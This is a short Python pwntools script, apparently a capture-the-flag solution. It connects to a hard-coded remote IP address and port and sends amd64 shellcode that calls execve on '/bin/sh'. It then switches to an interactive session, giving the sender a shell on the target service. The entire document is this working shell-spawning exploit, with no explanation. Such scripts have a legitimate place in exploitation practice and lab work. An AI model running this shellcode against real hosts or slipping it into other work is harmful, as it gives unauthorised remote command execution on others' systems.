from pwn import *

c = connect('103.77.175.40', 6071)
assembly = asm('''
	mov rax, 0x3b
	mov r8, 29400045130965551
	push r8
	mov rdi, rsp
	
	xor rsi, rsi
	xor rdx, rdx
	syscall
               ''', arch = 'amd64')
input()
c.sendlineafter(':\n', assembly)
c.interactive()
